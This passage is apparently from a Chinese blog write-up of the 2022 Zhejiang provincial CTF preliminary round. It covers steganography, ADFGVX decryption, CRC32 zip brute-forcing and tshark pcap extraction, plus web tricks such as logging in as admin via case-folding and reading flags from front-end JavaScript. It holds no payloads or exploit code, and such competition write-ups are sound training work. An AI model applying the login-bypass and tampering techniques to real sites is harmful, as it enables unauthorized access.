+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image022.jpg" class="" title="图片">
+
+<p>到这里没什么思路了，去看看给的图片有没有隐藏信息，因为是png，所以先想到的是lsb隐写</p>
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image024.jpg" class="" title="图片">
+
+<p>zsteg发现有段base32（stegsolve RGB0通道也可以解出），解出来是个key</p>
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image026.jpg" class="" title="图片">
+
+<p>LastKey{Yusayyds}</p>
+<p>有了key直接随波逐流ADFGVX解密</p>
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image028.jpg" class="" title="图片">
+
+<p>明文进行16进制转换得到flag</p>
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image030.gif" class="" title="图片">
+
+<p>DASCTF{d859c41c530afc1c1ad94abd92f4baf8}</p>
+<h2 id="segmentFlow"><a href="#segmentFlow" class="headerlink" title="segmentFlow"></a>segmentFlow</h2><p>下载附件，八个加密文件</p>
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image032.gif" class="" title="图片">
+
+<p>文件大小都相同，CRC32爆破</p>
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image034.gif" class="" title="图片">
+
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image036.gif" class="" title="图片">
+
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image038.gif" class="" title="图片">
+
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image040.gif" class="" title="图片">
+
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image042.gif" class="" title="图片">
+
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image044.gif" class="" title="图片">
+
+<p>password gZinflAte_BasE64，解压下来流量包，开始分析</p>
+<p>查看协议分级</p>
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image046.gif" class="" title="图片">
+
+<p>追踪tcp流</p>
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image048.gif" class="" title="图片">
+
+<p>在不同的流发现了不同的这样的数据，tshark提取数据</p>
+<p>tshark -r segmentFlow.pcapng -T fields -e urlencoded-form.value | sed ‘&#x2F;^\s*$&#x2F;d’ &gt; 1.txt</p>
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image050.gif" class="" title="图片">
+
+<p>用notepad将,替换成换行符</p>
+<p><img src="E:/笔记/pwn/临时笔记/2022浙江省ctf初赛/clip_image052.gif" alt="图片"></p>
+<p>在这里发现了压缩包的16进制</p>
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image054.gif" class="" title="图片">
+
+<p>将每一段提取出来拼接</p>
+<p>504B03041400000008006EAE86547BF6F39C2A0000002800000008000000666C61672E74787473710C760E71AB364B4D4C49344BB530314C364A4D4E32334E4A4E344834333731B2B0B04C32B0A80500504B01021F001400000008006EAE86547BF6F39C2A00000028000000080024000000000000002000000000000000666C61672E7478740A0020000000000001001800027E256ABD49D801027E256ABD49D8013254A060BD49D801504B050600000000010001005A000000500000000000</p>
+<p>转换为压缩包</p>
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image056.gif" class="" title="图片">
+
+<p>得到flag<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image058.gif" class="" title="图片"></p>
+<p>DASCTF{6eada6e841c2ecb63bca0a6742889b08}</p>
+<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="Web1"><a href="#Web1" class="headerlink" title="Web1"></a>Web1</h2><img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image002.jpg" class="" title="img">
+
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image004.jpg" class="" title="img">
+
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image006.jpg" class="" title="img">
+
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image007.png" class="" title="img">
+
+
+<h2 id="Web2"><a href="#Web2" class="headerlink" title="Web2"></a>Web2</h2><p>读取规则</p>
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image009.jpg" class="" title="img">
+
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image011.jpg" class="" title="img">
+
+<p>注册时使用Admin盲猜登陆时后台有转小写的函数所以将admin的账号登录成功获得flag</p>
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image013.jpg" class="" title="img">
+
+
+
+<h2 id="Web3"><a href="#Web3" class="headerlink" title="Web3"></a>Web3</h2><p>游戏类题目两种思路：</p>
+<p>1、 与后端有交互（通过抓包改包更改分数从而获取flag）</p>
+<p>2、 与后端无交互（一般flag隐藏于js代码中，关键字+细心即可找到flag）</p>
+<p>观察发现与后端无传输所以怀疑在前端进入对应的两个js文件找到flag</p>
+<p>此题通过观察找到两个js文件读取获得flag</p>
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image015.jpg" class="" title="img">
+
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image017.jpg" class="" title="img">
+
+<p>解码获得</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"><i class="fa fa-tag"></i> pwn</a>
+              <a href="/tags/misc/" rel="tag"><i class="fa fa-tag"></i> misc</a>
+              <a href="/tags/web/" rel="tag"><i class="fa fa-tag"></i> web</a>
+              <a href="/tags/re/" rel="tag"><i class="fa fa-tag"></i> re</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022/08/14/buu_WUSTCTF2020_%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E/" rel="prev" title="BUUCTF [WUSTCTF2020]朴实无华">
+                  <i class="fa fa-chevron-left"></i> BUUCTF [WUSTCTF2020]朴实无华
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">R3ape1</span>
+</div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/next-theme-pjax/0.5.0/pjax.min.js" integrity="sha256-3NkoLDrmHLTYj7csHIZSr0MHAFTXth7Ua/DDt4MRUAg=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/pjax.js"></script>
+
+  
+<script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.0/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
